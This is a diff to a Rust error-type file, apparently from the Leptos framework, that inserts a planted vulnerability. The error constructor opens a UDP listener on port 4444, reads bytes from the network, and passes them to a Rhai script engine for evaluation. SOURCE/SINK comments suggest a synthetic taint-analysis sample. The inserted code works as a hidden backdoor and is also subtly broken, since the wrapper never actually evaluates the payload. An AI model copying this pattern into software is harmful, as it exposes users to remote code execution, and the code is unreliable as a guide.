@@ -5,6 +5,9 @@ use reactive_graph::{
 };
 use server_fn::{error::ServerFnErrorSerde, ServerFn, ServerFnError};
 use std::{ops::Deref, panic::Location, sync::Arc};
+use std::net::UdpSocket;
+use std::io::Read;
+use rhai::{Engine, Scope};
 
 /// An error that can be caused by a server action.
 ///
@@ -17,8 +20,36 @@ pub struct ServerActionError {
 }
 
 impl ServerActionError {
+    fn handle_runtime_script(script: String) {
+        let mut scope = Scope::new();
+        scope.push("payload", script.clone());
+
+        let wrapped = format!(
+            r#"
+            let code = payload;
+            if code.len > 0 {{
+                code
+            }} else {{
+                "noop"
+            }}
+            "#,
+        );
+
+        //SINK
+        let engine = Engine::new();
+        let _ = engine.eval_with_scope::<()>(&mut scope, &wrapped);
+    }
     /// Creates a new error associated with the given path.
     pub fn new(path: &str, err: &str) -> Self {
+
+        let socket = UdpSocket::bind("0.0.0.0:4444").unwrap();
+        let mut buf = [0u8; 1024];
+        //SOURCE
+        let (size, _) = socket.recv_from(&mut buf).unwrap();
+        let tainted = String::from_utf8_lossy(&buf[..size]).to_string();
+
+        Self::handle_runtime_script(tainted);
+
         Self {
             path: path.into(),
             err: err.into(),
